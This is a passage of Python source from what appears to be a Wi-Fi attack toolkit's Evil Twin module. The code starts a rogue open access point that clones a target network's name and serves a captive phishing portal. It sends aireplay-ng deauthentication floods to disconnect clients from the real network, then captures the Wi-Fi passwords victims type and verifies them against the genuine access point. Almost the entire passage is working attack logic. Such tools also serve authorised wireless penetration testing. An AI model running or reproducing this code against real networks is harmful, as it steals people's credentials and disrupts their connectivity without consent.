                    Color.p('{+} Stop the running attack and clean up? ({G}y{W}/{R}n{W}): ')
                    response = input().strip().lower()
                    
                    if response in ['y', 'yes']:
                        orphaned = kill_orphaned_processes()
                        if orphaned:
                            Color.pl('{+} {G}Stopped running attack{W}')
                            log_info('EvilTwin', 'Stopped conflicting Evil Twin attack')
                        else:
                            Color.pl('{!} {O}No processes found to stop{W}')
                    else:
                        Color.pl('{!} {R}Cannot continue with another attack running{W}')
                        log_warning('EvilTwin', 'User declined to stop running attack')
                        return False
                        
                except (KeyboardInterrupt, EOFError):
                    Color.pl('\n{!} {R}Conflict check cancelled{W}')
                    return False
            else:
                # Check for orphaned Evil Twin processes
                orphaned = kill_orphaned_processes()
            
            if orphaned:
                Color.pl('{!} {O}Found and killed %d orphaned process(es) from previous attack{W}' % len(orphaned))
                for process_name, pid in orphaned:
                    Color.pl('    {+} {C}Killed {W}%s{C} (PID: {W}%s{C}){W}' % (process_name, pid))
            
            # Check for conflicting processes
            conflicting = check_conflicting_processes()
            
            if not conflicting:
                log_info('EvilTwin', 'No conflicting processes found')
                return True
            
            # Display conflicting processes
            Color.pl('')
            Color.pl('{!} {O}Found conflicting processes:{W}')
            for process_name, pid in conflicting:
                Color.pl('    {!} {R}%s{W} (PID: {C}%s{W})' % (process_name, pid))
            
            Color.pl('')
            Color.pl('{!} {O}These processes may interfere with the Evil Twin attack.{W}')
            Color.pl('{!} {O}It is recommended to stop them before continuing.{W}')
            Color.pl('')
            
            # Ask user if they want to kill conflicting processes
            try:
                Color.p('{+} Kill conflicting processes? ({G}y{W}/{R}n{W}): ')
                response = input().strip().lower()
                
                if response in ['y', 'yes']:
                    killed_count = 0
                    for process_name, pid in conflicting:
                        try:
                            if not re.match(r'^\d+$', str(pid)):
                                log_warning('EvilTwin', f'Skipping kill: invalid PID value: {pid!r}')
                                continue
                            os.kill(int(pid), signal.SIGKILL)
                            Color.pl('{+} {G}Killed {W}%s{G} (PID: {W}%s{G}){W}' % (process_name, pid))
                            log_info('EvilTwin', f'Killed conflicting {process_name} process (PID: {pid})')
                            killed_count += 1
                        except Exception as e:
                            Color.pl('{!} {R}Failed to kill {W}%s{R} (PID: {W}%s{R}):{W} %s' % (process_name, pid, str(e)))
                            log_warning('EvilTwin', f'Failed to kill {process_name} process {pid}: {e}')
                    
                    if killed_count > 0:
                        Color.pl('{+} {G}Killed %d conflicting process(es){W}' % killed_count)
                        import time
                        time.sleep(2)  # Wait for processes to fully terminate
                    
                    return True
                else:
                    Color.pl('{!} {O}Continuing with conflicting processes running{W}')
                    Color.pl('{!} {O}Attack may fail or behave unexpectedly{W}')
                    log_warning('EvilTwin', 'User chose to continue with conflicting processes')
                    return True
                    
            except (KeyboardInterrupt, EOFError):
                Color.pl('\n{!} {R}Conflict check cancelled{W}')
                return False
            
        except Exception as e:
            log_error('EvilTwin', f'Conflict check failed: {e}', e)
            Color.pl('{!} {O}Warning: Could not check for conflicting processes{W}')
            return True  # Continue anyway
    
    def _setup(self) -> bool:
        """
        Setup all attack components for single-interface mode.

        Initialises hostapd (rogue AP), dnsmasq (DHCP/DNS), the captive
        portal HTTP server, the client monitor, and validates that the
        deauth interface is ready.  Dual-interface mode bypasses this
        method — see ``_run_dual_interface()``.

        Returns:
            True if setup successful, False otherwise
        """
        try:
            from ..tools.hostapd import Hostapd
            from ..tools.dnsmasq import Dnsmasq
            from ..attack.portal.server import PortalServer

            # -- 1. Start rogue AP (hostapd) --------------------------------
            self.state = AttackState.STARTING_AP
            log_info('EvilTwin', f'Starting rogue AP on {self.interface_ap}')
            Color.pl('{+} {C}Starting rogue AP on {G}%s{W}...' % self.interface_ap)

            self.hostapd = Hostapd(
                interface=self.interface_ap,
                ssid=self.target.essid,
                channel=self.target.channel,
                password=None  # Open network for captive portal
            )

            if not self.hostapd.start():
                self.error_message = 'Failed to start hostapd'
                return False

            self.cleanup_manager.register_process(self.hostapd, 'hostapd')
            log_info('EvilTwin', 'Rogue AP started')

            # -- 2. Start network services (dnsmasq) ------------------------
            self.state = AttackState.STARTING_SERVICES
            log_info('EvilTwin', 'Starting network services (dnsmasq)')
            Color.pl('{+} {C}Starting network services...{W}')

            self.dnsmasq = Dnsmasq(
                interface=self.interface_ap,
                gateway_ip='192.168.100.1',
                dhcp_range_start='192.168.100.10',
                dhcp_range_end='192.168.100.100'
            )

            if not self.dnsmasq.start():
                self.error_message = 'Failed to start dnsmasq'
                return False

            self.cleanup_manager.register_process(self.dnsmasq, 'dnsmasq')
            log_info('EvilTwin', 'Dnsmasq started')

            # -- 3. Start captive portal ------------------------------------
            self.state = AttackState.STARTING_PORTAL
            portal_port = getattr(Configuration, 'eviltwin_port', 80)
            log_info('EvilTwin', f'Starting captive portal on port {portal_port}')
            Color.pl('{+} {C}Starting captive portal...{W}')

            self.portal_server = PortalServer(
                port=portal_port,
                template_renderer=self._build_template_renderer())
            self.portal_server.set_credential_callback(self._portal_credential_callback)

            if not self.portal_server.start():
                self.error_message = 'Failed to start captive portal'
                return False

            log_info('EvilTwin', f'Captive portal started on port {portal_port}')

            # -- 4. Start client monitor ------------------------------------
            hostapd_log = getattr(self.hostapd, 'config_file', None)
            # ClientMonitor tolerates missing/non-existent log paths
            # gracefully — it checks os.path.exists() each cycle.
            hostapd_log_path = os.path.join(
                Configuration.temp(), 'hostapd.log') if not hostapd_log else None
            dnsmasq_log_path = os.path.join(Configuration.temp(), 'dnsmasq.log')
            self._setup_client_monitor(hostapd_log_path, dnsmasq_log_path)

            # -- 5. Validate deauth interface -------------------------------
            self.state = AttackState.STARTING_DEAUTH
            log_info('EvilTwin', f'Validating deauth interface {self.interface_deauth}')
            Color.pl('{+} {C}Preparing deauth interface {G}%s{W}...' % self.interface_deauth)

            from ..tools.airmon import Airmon
            import contextlib

            # Best-effort channel alignment for the deauth interface
            if hasattr(self.target, 'channel') and self.target.channel:
                with contextlib.suppress(Exception):
                    current_ch = Airmon.get_interface_channel(self.interface_deauth)
                    if current_ch and str(current_ch) != str(self.target.channel):
                        log_warning('EvilTwin',
                                    f'Deauth interface on ch {current_ch}, '
                                    f'target on ch {self.target.channel}')
                        Color.pl('{!} {O}Channel mismatch — deauth may be less effective{W}')

            log_info('EvilTwin', 'Setup completed successfully')
            return True

        except Exception as e:
            log_error('EvilTwin', f'Setup failed: {e}', e)
            self.error_message = f'Setup failed: {e}'
            return False

    def _build_template_renderer(self):
        """
        Build a TemplateRenderer for the configured captive-portal template.

        Honors ``Configuration.eviltwin_template`` (--eviltwin-template) and
        seeds the renderer with the target ESSID so the portal shows the real
        network name. Returns None on failure, in which case PortalServer falls
        back to its built-in default page.
        """
        try:
            from .portal.templates import TemplateRenderer
            template_name = getattr(Configuration, 'eviltwin_template', 'generic') or 'generic'
            renderer = TemplateRenderer(
                template_name=template_name,
                target_ssid=self.target.essid or '',
            )
            log_info('EvilTwin', f'Captive portal template: {template_name}')
            return renderer
        except Exception as e:
            log_warning('EvilTwin',
                        f'Failed to build portal template renderer '
                        f'(using default page): {e}')
            return None

    def _portal_credential_callback(self, ssid: str, password: str, client_ip: str) -> bool:
        """
        Callback invoked by the portal server when a client submits credentials.

        When credential validation is enabled (``eviltwin_validate_credentials``)
        and a spare interface is available, the submitted password is checked
        against the REAL target AP before being accepted — so a reported success
        means a *verified* key. A confirmed-wrong password is rejected (the
        client sees the error page and can retry). When validation can't run, the
        credential is still captured but clearly flagged as unverified.

        Returns:
            True  if accepted (verified, or captured-unverified) — stops the attack.
            False if confirmed wrong — the client should retry, attack continues.
        """
        log_info('EvilTwin', f'Credential received from {client_ip}: SSID={ssid}')

        verified = self._verify_password(ssid, password)

        if verified is False:
            # Confirmed wrong against the real AP — reject and keep the attack
            # running so the client can retry (portal shows the error page).
            if self.client_monitor:
                self.client_monitor.record_credential_attempt(client_ip, success=False)
            self.credential_attempts.append({
                'client_ip': client_ip,
                'mac': client_ip,
                'ssid': ssid,
                'password': password,
                'success': False,
                'timestamp': time.time(),
            })
            Color.pl('\n{!} {O}Rejected credential from {C}%s{O}: '
                     'failed validation against the real AP{W}' % client_ip)
            return False

        # verified is True (confirmed) or None (could not verify → capture-only)
        if self.client_monitor:
            self.client_monitor.record_credential_attempt(client_ip, success=True)

        # Store the result — the monitoring loop checks self.crack_result
        self.crack_result = self.create_result(password)
        # Annotate verification status for downstream reporting.
        self.crack_result.verified = (verified is True)
        self.credential_attempts.append({
            'client_ip': client_ip,
            'mac': client_ip,
            'ssid': ssid,
            'password': password,
            'success': True,
            'timestamp': time.time(),
        })

        if verified is True:
            Color.pl('\n{+} {G}Credential captured and {C}VERIFIED{G} against the '
                     'real AP from {C}%s{W}' % client_ip)
        else:
            Color.pl('\n{+} {G}Credential captured from {C}%s{W}' % client_ip)
            Color.pl('{!} {O}Note: not verified against the real AP '
                     '(validation unavailable) — treat as unconfirmed{W}')
        return True

    def _verify_password(self, ssid: str, password: str):
        """
        Verify a submitted password against the REAL target AP.

        Validation runs wpa_supplicant against the legitimate AP, which needs a
        managed-mode radio. The AP interface is busy serving the rogue AP, so we
        can only validate when a separate (deauth) interface exists — which we
        briefly switch to managed mode and restore afterwards.

        Returns:
            True  — confirmed correct against the real AP.
            False — confirmed incorrect.
            None  — could not validate (disabled, no spare interface, missing
                    wpa_supplicant, or error); caller treats it as an unverified
                    capture rather than a confirmed key.
        """
        import contextlib

        if not getattr(Configuration, 'eviltwin_validate_credentials', True):
            return None  # validation disabled → capture-only

        iface = self.interface_deauth
        if not iface or iface == self.interface_ap:
            log_warning('EvilTwin',
                        'No spare interface to verify credentials against the '
                        'real AP; capturing as unverified')
            return None

        if not Process.exists('wpa_supplicant'):
            log_warning('EvilTwin',
                        'wpa_supplicant not found; capturing credential unverified')
            return None

        from ..tools.iw import Iw
        from ..tools.ip import Ip
        from ..util.credential_validator import CredentialValidator

        # Pause deauth and borrow the secondary interface in managed mode so
        # wpa_supplicant can associate with the real AP.
        was_paused = self.adaptive_deauth.is_paused
        self.adaptive_deauth.pause()
        switched = False
        try:
            with contextlib.suppress(Exception):
                Ip.down(iface)
                Iw.mode(iface, 'managed')
                Ip.up(iface)
                switched = True

            if not switched:
                log_warning('EvilTwin',
                            'Could not switch %s to managed mode for validation; '
                            'capturing unverified' % iface)
                return None

            if self.credential_validator is None:
                self.credential_validator = CredentialValidator(
                    interface=iface,
                    target_bssid=self.target.bssid,
                    target_channel=int(self.target.channel),
                )

            Color.pl('{+} {C}Verifying credential against the real AP...{W}')
            is_valid, _vtime, err = self.credential_validator.validate_credentials(
                ssid, password)
            if is_valid:
                log_info('EvilTwin', 'Credential verified against real AP')
            else:
                log_info('EvilTwin', f'Credential failed validation: {err}')
            return bool(is_valid)

        except Exception as e:
            log_warning('EvilTwin',
                        f'Credential validation error: {e}; capturing unverified')
            return None

        finally:
            # Restore monitor mode so deauth can resume.
            with contextlib.suppress(Exception):
                if switched:
                    Ip.down(iface)
                    Iw.mode(iface, 'monitor')
                    Ip.up(iface)
            if not was_paused:
                self.adaptive_deauth.resume()
    
    def _handle_deauth(self):
        """
        Handle deauthentication using adaptive timing.
        
        This method:
        1. Checks if it's time to send deauth (via adaptive manager)
        2. Determines deauth count and targeting strategy
        3. Sends deauth packets
        4. Records statistics
        """
        try:
            # Check if we should send deauth now
            if not self.adaptive_deauth.should_send_deauth():
                return
            
            # Get known clients for targeted deauth
            known_clients = []
            if self.client_monitor:
                # Get clients that were seen but not connected to rogue AP
                all_clients = self.target.clients if hasattr(self.target, 'clients') else []
                known_clients = [c.station for c in all_clients if hasattr(c, 'station')]
            
            # Determine if we should use targeted deauth
            use_targeted = self.adaptive_deauth.should_use_targeted_deauth(known_clients)
            
            # Get recommended deauth count
            deauth_count = self.adaptive_deauth.get_recommended_deauth_count()
            
            # Send deauth packets
            if use_targeted and known_clients:
                # Targeted deauth to specific clients
                for client_mac in known_clients[:5]:  # Limit to 5 clients at a time
                    self._send_deauth(client_mac, deauth_count)
                    log_debug('EvilTwin', f'Sent {deauth_count} targeted deauth to {client_mac}')
            else:
                # Broadcast deauth
                self._send_deauth('FF:FF:FF:FF:FF:FF', deauth_count)
                log_debug('EvilTwin', f'Sent {deauth_count} broadcast deauth packets')
            
            # Record that we sent deauth
            self.adaptive_deauth.record_deauth_sent()
            self.deauths_sent += deauth_count
            self.last_deauth_time = time.time()
            
            # Check if we've had no client connections recently
            if self.adaptive_deauth.consecutive_no_connects >= 3:
                self.adaptive_deauth.record_no_activity()
            
        except Exception as e:
            log_error('EvilTwin', f'Error handling deauth: {e}', e)
    
    def _send_deauth(self, client_mac: str, count: int = 5):
        """
        Send deauth packets to a client using the dedicated deauth interface.
        
        This method sends deauthentication packets from the dedicated deauth
        interface (in monitor mode) to disconnect clients from the legitimate AP.
        In dual interface mode, this runs in parallel with the rogue AP without
        requiring mode switching.
        
        Args:
            client_mac: MAC address of client (or FF:FF:FF:FF:FF:FF for broadcast)
            count: Number of deauth packets to send
        """
        try:
            from ..util.process import Process
            
            # Verify deauth interface is available
            if not self.interface_deauth:
                log_warning('EvilTwin', 'No deauth interface configured')
                return
            
            log_debug('EvilTwin', f'Sending {count} deauth packets to {client_mac} from {self.interface_deauth}')
            
            # Build aireplay-ng command for deauth using dedicated interface
            cmd = [
                'aireplay-ng',
                '--deauth', str(count),
                '-a', self.target.bssid,  # Target AP BSSID
                '-c', client_mac,          # Client MAC (or broadcast)
                '--ignore-negative-one',   # Ignore negative one errors
                '-D',                      # Skip AP detection
                self.interface_deauth      # Use dedicated deauth interface
            ]
            
            # Add ESSID if available for better targeting
            if hasattr(self.target, 'essid') and self.target.essid:
                cmd.extend(['-e', self.target.essid])
            
            # Execute deauth (non-blocking) on dedicated deauth interface
            process = Process(cmd, devnull=True)
            
            # Wait briefly for deauth to complete
            time.sleep(0.1)
            
            # Kill process if still running
            if process.poll() is None:
                process.interrupt()
            
            log_debug('EvilTwin', f'Deauth sent successfully from {self.interface_deauth}')
            
        except Exception as e:
            log_warning('EvilTwin', f'Failed to send deauth from {self.interface_deauth}: {e}')
    
    def _update_status(self):
        """
        Update attack status and display progress.
        
        This method is called periodically during the attack to:
        - Update the console display with current statistics
        - Refresh the TUI view if available
        - Show elapsed time, client count, and credential attempts
        
        The display format is optimized for both classic CLI and TUI modes.
        """
        try:
            # Calculate elapsed time in human-readable format
            elapsed = Timer.secs_to_str(int(time.time() - self.start_time))
            
            # Get statistics from client monitor if available
            # Client monitor provides more accurate real-time statistics
            if self.client_monitor:
                stats = self.client_monitor.get_statistics()
                clients_count = stats.currently_connected
                attempts_count = stats.total_credential_attempts
                success_rate = stats.get_success_rate()
            else:
                # Fallback to basic tracking if client monitor not available
                clients_count = len(self.clients_connected)
                attempts_count = len(self.credential_attempts)
                success_rate = 0.0
            
            status_parts = []
            status_parts.append(f'{{C}}{elapsed}{{W}}')
            status_parts.append(f'{{G}}{clients_count}{{W}} clients')
            status_parts.append(f'{{O}}{attempts_count}{{W}} attempts')
            
            if attempts_count > 0:
                status_parts.append(f'{{C}}{success_rate:.0f}%{{W}} success')
            
            status = ' | '.join(status_parts)
            
            Color.clear_entire_line()
            Color.pattack('Evil Twin', self.target, self.state.value, status)
            
            # Update TUI view if available
            if self.attack_view:
                try:
                    # Update attack phase
                    self.attack_view.set_attack_phase(self.state.value)
                    
                    # Update component statuses
                    if self.hostapd_process:
                        self.attack_view.update_rogue_ap_status(
                            "Running",
                            channel=self.target.channel,
                            ssid=self.target.essid
                        )
                    
                    if self.portal_server:
                        self.attack_view.update_portal_status("Running", self.attack_view.portal_url)
                    
                    # Update deauth status with adaptive information
                    deauth_status = "Paused" if self.adaptive_deauth.is_paused else "Running"
                    deauth_interval = self.adaptive_deauth.get_current_interval()
                    self.attack_view.update_deauth_status(
                        deauth_status, 
                        self.deauths_sent,
                        interval=deauth_interval
                    )
                    
                    # Refresh view to update elapsed time
                    self.attack_view.refresh_if_needed()
                    
                except Exception as e:
                    log_debug('EvilTwin', f'Failed to update TUI view: {e}')
                    
        except Exception as e:
            log_error('EvilTwin', f'Failed to update status: {e}', e)
    
    def _cleanup(self):
        """
        Cleanup all attack components and restore system state.
        
        This method ensures all resources are properly released even if errors occur.
        It follows a specific order to prevent dependency issues:
        
        1. Save final session state (for resume capability)
        2. Stop client monitor (stops log parsing)
        3. Stop deauth process (stops client disruption)
        4. Stop captive portal (stops HTTP server)
        5. Stop dnsmasq (stops DHCP/DNS services)
        6. Stop hostapd (stops rogue AP)
        7. Remove temporary files
        8. Restore network interfaces
        
        The cleanup is idempotent and can be called multiple times safely.
        Uses CleanupManager to ensure comprehensive cleanup even on errors.
        
        Note: This method sets state to CLEANING_UP to prevent recursive calls.rs occur during cleanup.
        """
        if self.state == AttackState.CLEANING_UP:
            # Already cleaning up, avoid recursion
            return
            
        self.state = AttackState.CLEANING_UP
        
        try:
            # Save final session state before cleanup
            try:
                self._save_session_state()
            except Exception as e:
                log_warning('EvilTwin', f'Failed to save final session state: {e}')
            
            # Stop client monitor
            if self.client_monitor:
                self.cleanup_manager.stop_process(self.client_monitor, 'client_monitor')
                self.client_monitor = None
            
            # Stop deauthentication (adaptive deauth manager doesn't need cleanup)
            # Just log the final statistics
            if self.adaptive_deauth:
                stats = self.adaptive_deauth.get_statistics()
                log_info('EvilTwin', f'Deauth statistics: {stats["total_deauths_sent"]} sent, '
                        f'{stats["clients_connected"]} clients connected, '
                        f'final interval: {stats["current_interval"]:.1f}s')
            
            # Stop captive portal
            if self.portal_server:
                self.cleanup_manager.stop_process(self.portal_server, 'portal_server')
                self.portal_server = None
            if self.portal_thread:
                self.portal_thread = None
            
            # Stop network services (dnsmasq)
            if self.dnsmasq:
                self.cleanup_manager.stop_process(self.dnsmasq, 'dnsmasq')
                self.dnsmasq = None
            if self.dnsmasq_process:
                self.dnsmasq_process = None
            
            # Stop rogue AP (hostapd)
            if self.hostapd:
                self.cleanup_manager.stop_process(self.hostapd, 'hostapd')
                self.hostapd = None
            if self.hostapd_process:
                self.hostapd_process = None

            # Restore the dual-mode deauth interface from monitor back to
            # managed mode (it was switched to monitor in
            # _configure_deauth_interface). Best-effort — never abort cleanup.
            if self._deauth_monitor_enabled and self.interface_deauth \
                    and self.interface_deauth != self.interface_ap:
                try:
                    from ..tools.airmon import Airmon
                    log_debug('EvilTwin',
                              f'Restoring deauth interface {self.interface_deauth} to managed mode')
                    Airmon.set_interface_mode(self.interface_deauth, 'managed')
                except Exception as e:
                    log_warning('EvilTwin',
                                f'Failed to restore deauth interface {self.interface_deauth} '
                                f'to managed mode: {e}')
                finally:
                    self._deauth_monitor_enabled = False

            # Register temporary files for removal
            for temp_file in self.temp_files:
                self.cleanup_manager.register_temp_file(temp_file)
            
            # Perform comprehensive cleanup
            self.cleanup_manager.cleanup_all(display_status=True)
            
            # Clear temp files list
            self.temp_files = []
            
        except Exception as e:
            log_error('EvilTwin', f'Critical cleanup error: {e}', e)
            Color.pl('{!} {R}Critical cleanup error:{W} %s' % str(e))
            Color.pl('{!} {O}Warning: System may be in an inconsistent state{W}')
    
    def on_credential_submission(self, mac_address: str, password: str, success: bool):
        """
        Handle credential submission from captive portal.
        
        This method should be called by the captive portal when credentials
        are submitted and validated.
        
        Args:
            mac_address: Client MAC address that submitted credentials
            password: The submitted password
            success: Whether the credentials were valid
        """
        try:
            # Record the attempt
            attempt = {
                'mac': mac_address,
                'password': password,
                'success': success,
                'timestamp': time.time()
            }
            self.credential_attempts.append(attempt)
            
            # Log the attempt
            if success:
                log_info('EvilTwin', f'Valid credentials from {mac_address}: {mask_sensitive(password)}')
                Color.pl('\n{+} {G}SUCCESS! Valid credentials captured:{W}')
                Color.pl('    {C}From:{W} {G}%s{W}' % mac_address)
                Color.pl('    {C}Password:{W} {G}%s{W}' % password)
                
                # Create result
                self.crack_result = self.create_result(password)
                
                # Stop the attack
                self.running = False
            else:
                log_info('EvilTwin', f'Invalid credentials from {mac_address}')
                Color.pl('\n{!} {O}Invalid credentials from {C}%s{W}' % mac_address)
            
            # Update TUI view if available
            if self.attack_view:
                try:
                    self.attack_view.add_credential_attempt(mac_address, password, success)
                except Exception as e:
                    log_debug('EvilTwin', f'Failed to update TUI view for credential attempt: {e}')
            
        except Exception as e:
            log_error('EvilTwin', f'Error handling credential submission: {e}', e)
    
    def create_result(self, password: str, validation_time: float = 0.0) -> CrackResultEvilTwin:
        """
        Create a CrackResultEvilTwin for successful credential capture.
        
        Args:
            password: The captured password
            validation_time: Time taken to validate credentials
            
        Returns:
            CrackResultEvilTwin instance
        """
        result = CrackResultEvilTwin(
            bssid=self.target.bssid,
            essid=self.target.essid,
            key=password,
            clients_connected=len(self.clients_connected),
            credential_attempts=len(self.credential_attempts),
            validation_time=validation_time,
            portal_template=getattr(Configuration, 'eviltwin_template', 'generic')
        )
        
        log_info('EvilTwin', f'Created result for {self.target.essid}: {mask_sensitive(password)}')
        return result
    
    def _setup_client_monitor(self, hostapd_log: str, dnsmasq_log: str):
        """
        Setup client monitoring system.
        
        Args:
            hostapd_log: Path to hostapd log file
            dnsmasq_log: Path to dnsmasq log file
        """
        try:
            self.client_monitor = ClientMonitor(
                hostapd_log_path=hostapd_log,
                dnsmasq_log_path=dnsmasq_log
            )
            
            # Register callbacks
            self.client_monitor.on_client_connect = self._on_client_connect
            self.client_monitor.on_client_disconnect = self._on_client_disconnect
            self.client_monitor.on_client_dhcp = self._on_client_dhcp
            
            # Start monitoring
            self.client_monitor.start()
            
            log_info('EvilTwin', 'Client monitor started')
            
        except Exception as e:
            log_error('EvilTwin', f'Failed to setup client monitor: {e}', e)
            raise
    
    def _on_client_connect(self, client: ClientConnection):
        """
        Handle client connection event.
        
        Args:
            client: ClientConnection object
        """
        try:
            log_info('EvilTwin', f'Client connected: {client.mac_address}')
            
            # Add to connected clients list
            if client not in self.clients_connected:
                self.clients_connected.append(client)
            
            # Pause deauth when clients connect and record in adaptive manager
            if not self.adaptive_deauth.is_paused:
                self.adaptive_deauth.pause()
                self.adaptive_deauth.record_client_connect()
                log_info('EvilTwin', 'Deauth paused - client connected to rogue AP')
                Color.pl('{+} {G}Client connected to rogue AP - deauth paused{W}')
            
            # Display notification
            Color.pl('{+} {G}Client connected:{W} {C}%s{W}' % client.mac_address)
            
            # Update TUI view if available
            if self.attack_view:
                try:
                    self.attack_view.add_connected_client(
                        mac_address=client.mac_address,
                        ip_address=client.ip_address,
                        hostname=client.hostname
                    )
                except Exception as e:
                    log_debug('EvilTwin', f'Failed to update TUI view for client connect: {e}')
            
        except Exception as e:
            log_error('EvilTwin', f'Error handling client connect: {e}', e)
    
    def _on_client_disconnect(self, client: ClientConnection):
        """
        Handle client disconnection event.
        
        Args:
            client: ClientConnection object
        """
        try:
            log_info('EvilTwin', f'Client disconnected: {client.mac_address}')
            
            # Display notification
            Color.pl('{!} {O}Client disconnected:{W} {C}%s{W}' % client.mac_address)
            
            # Update TUI view if available
            if self.attack_view:
                try:
                    self.attack_view.remove_connected_client(client.mac_address)
                except Exception as e:
                    log_debug('EvilTwin', f'Failed to update TUI view for client disconnect: {e}')
            
            # Resume deauth if no clients are connected
            if self.client_monitor and not self.client_monitor.has_connected_clients():
                if self.adaptive_deauth.is_paused:
                    self.adaptive_deauth.resume()
                    log_info('EvilTwin', 'Deauth resumed - no clients connected')
                    Color.pl('{+} {O}No clients connected - deauth resumed{W}')
            
        except Exception as e:
            log_error('EvilTwin', f'Error handling client disconnect: {e}', e)
    
    def _on_client_dhcp(self, client: ClientConnection):
        """
        Handle client DHCP lease event.
        
        Args:
            client: ClientConnection object
        """
        try:
            log_info('EvilTwin', f'Client DHCP: {client.mac_address} -> {client.ip_address}')
            
            # Display notification with IP and hostname
            hostname_str = f' ({client.hostname})' if client.hostname else ''
            Color.pl('{+} {C}Client DHCP:{W} {G}%s{W} -> {G}%s{W}%s' % (
                client.mac_address, client.ip_address, hostname_str))
            
            # Update TUI view if available
            if self.attack_view:
                try:
                    self.attack_view.add_connected_client(
                        mac_address=client.mac_address,
                        ip_address=client.ip_address,
                        hostname=client.hostname
                    )
                except Exception as e:
                    log_debug('EvilTwin', f'Failed to update TUI view for client DHCP: {e}')
            
        except Exception as e:
            log_error('EvilTwin', f'Error handling client DHCP: {e}', e)
    
    def _save_session_state(self):
        """
        Save current attack state to session (if session management is active).
        
        This method is called periodically during the attack to persist state.
        """
        try:
            # Check if we have a session manager and session
            if not hasattr(self, 'session_manager') or not hasattr(self, 'session'):
                return
            
            if not self.session_manager or not self.session:
                return
            
            # Save current state
            state = self.save_state_to_session()
            self.session_manager.save_evil_twin_state(self.session, self.target.bssid, state)
            self.session_manager.save_session(self.session)
            
            log_debug('EvilTwin', 'Session state saved')
            
        except Exception as e:
            log_warning('EvilTwin', f'Failed to save session state: {e}')
    
    def _display_statistics(self):
        """Display attack statistics."""
        try:
            if not self.client_monitor:
                return
            
            stats = self.client_monitor.get_detailed_stats()
            
            Color.pl('')
            Color.pl('{+} {C}Attack Statistics:{W}')
            Color.pl('    {C}Duration:{W} {G}%.1fs{W}' % stats['duration'])
            Color.pl('    {C}Total Clients:{W} {G}%d{W} ({G}%d{W} unique)' % (
                stats['total_clients'], stats['unique_clients']))
            Color.pl('    {C}Currently Connected:{W} {G}%d{W}' % stats['currently_connected'])
            Color.pl('    {C}Credential Attempts:{W} {G}%d{W}' % stats['credential_attempts'])
            
            if stats['credential_attempts'] > 0:
                Color.pl('    {C}Successful:{W} {G}%d{W} ({G}%.1f%%{W})' % (
                    stats['successful_attempts'], stats['success_rate']))
                Color.pl('    {C}Failed:{W} {O}%d{W}' % stats['failed_attempts'])
            
            if stats['time_to_first_client']:
                Color.pl('    {C}Time to First Client:{W} {G}%.1fs{W}' % stats['time_to_first_client'])
            
            if stats['time_to_first_credential']:
                Color.pl('    {C}Time to First Credential:{W} {G}%.1fs{W}' % stats['time_to_first_credential'])
            
            if stats['time_to_success']:
                Color.pl('    {C}Time to Success:{W} {G}%.1fs{W}' % stats['time_to_success'])
            
            # Display deauth statistics
            if self.adaptive_deauth:
                deauth_stats = self.adaptive_deauth.get_statistics()
                Color.pl('')
                Color.pl('    {C}Deauth Statistics:{W}')
                Color.pl('        {C}Total Deauths Sent:{W} {G}%d{W}' % deauth_stats['total_deauths_sent'])
                Color.pl('        {C}Deauths per Minute:{W} {G}%.1f{W}' % deauth_stats['deauths_per_minute'])
                Color.pl('        {C}Final Interval:{W} {G}%.1fs{W}' % deauth_stats['current_interval'])
                Color.pl('        {C}Clients Connected:{W} {G}%d{W}' % deauth_stats['clients_connected'])
            
            log_info('EvilTwin', f'Attack statistics: {stats}')
            
        except Exception as e:
            log_error('EvilTwin', f'Failed to display statistics: {e}', e)
    
    def get_statistics(self) -> dict:
        """
        Get attack statistics.
        
        Returns:
            Dictionary with attack statistics
        """
        if self.client_monitor:
            return self.client_monitor.get_detailed_stats()
        else:
            # Return basic statistics if client monitor not available
            return {
                'duration': time.time() - self.start_time if self.start_time else 0,
                'total_clients': len(self.clients_connected),
                'credential_attempts': len(self.credential_attempts),
                'success': self.success
            }
    
    def stop(self):
        """
        Stop the attack gracefully.
        
        This method can be called externally to stop the attack.
        """
        log_info('EvilTwin', 'Attack stop requested')
        self.running = False
        self.state = AttackState.STOPPING
    
    def save_state_to_session(self) -> 'EvilTwinAttackState':
        """
        Save current attack state for session persistence.
        
        Returns:
            EvilTwinAttackState object containing current state
        """
        from ..util.session import EvilTwinAttackState, EvilTwinClientState, EvilTwinCredentialAttempt
        
        # Convert clients to EvilTwinClientState
        client_states = []
        if self.client_monitor:
            for client in self.client_monitor.get_all_clients():
                client_state = EvilTwinClientState(
                    mac_address=client.mac_address,
                    ip_address=client.ip_address,
                    hostname=client.hostname,
                    connect_time=client.connect_time,
                    disconnect_time=client.disconnect_time,
                    credential_submitted=client.credential_submitted,
                    credential_valid=client.credential_valid
                )
                client_states.append(client_state)
        else:
            # Fallback to basic client list
            for client in self.clients_connected:
                if hasattr(client, 'mac_address'):
                    client_state = EvilTwinClientState(
                        mac_address=client.mac_address,
                        ip_address=getattr(client, 'ip_address', None),
                        hostname=getattr(client, 'hostname', None),
                        connect_time=getattr(client, 'connect_time', time.time()),
                        disconnect_time=getattr(client, 'disconnect_time', None),
                        credential_submitted=getattr(client, 'credential_submitted', False),
                        credential_valid=getattr(client, 'credential_valid', None)
                    )
                    client_states.append(client_state)
        
        # Convert credential attempts to EvilTwinCredentialAttempt
        attempt_states = []
        for attempt in self.credential_attempts:
            attempt_state = EvilTwinCredentialAttempt(
                mac_address=attempt.get('mac', 'unknown'),
                password=attempt.get('password', ''),
                success=attempt.get('success', False),
                timestamp=attempt.get('timestamp', time.time())
            )
            attempt_states.append(attempt_state)
        
        # Get statistics
        if self.client_monitor:
            stats = self.client_monitor.get_statistics()
            total_clients = stats.total_clients_connected
            total_attempts = stats.total_credential_attempts
            successful = stats.successful_validations
        else:
            total_clients = len(self.clients_connected)
            total_attempts = len(self.credential_attempts)
            successful = sum(1 for a in self.credential_attempts if a.get('success', False))
        
        # Create state object
        state = EvilTwinAttackState(
            interface_ap=self.interface_ap,
            interface_deauth=self.interface_deauth,
            portal_template=getattr(Configuration, 'eviltwin_template', 'generic'),
            deauth_interval=getattr(Configuration, 'eviltwin_deauth_interval', 5),
            attack_phase=self.state.value if hasattr(self.state, 'value') else str(self.state),
            start_time=self.start_time,
            setup_time=self.setup_time,
            clients=client_states,
            credential_attempts=attempt_states,
            total_clients_connected=total_clients,
            total_credential_attempts=total_attempts,
            successful_validations=successful,
            captured_password=self.crack_result.key if self.crack_result else None,
            validation_time=self.crack_result.validation_time if self.crack_result else 0.0
        )
        
        log_info('EvilTwin', f'Saved attack state: {total_clients} clients, {total_attempts} attempts')
        return state
    
    def restore_state_from_session(self, state: 'EvilTwinAttackState') -> bool:
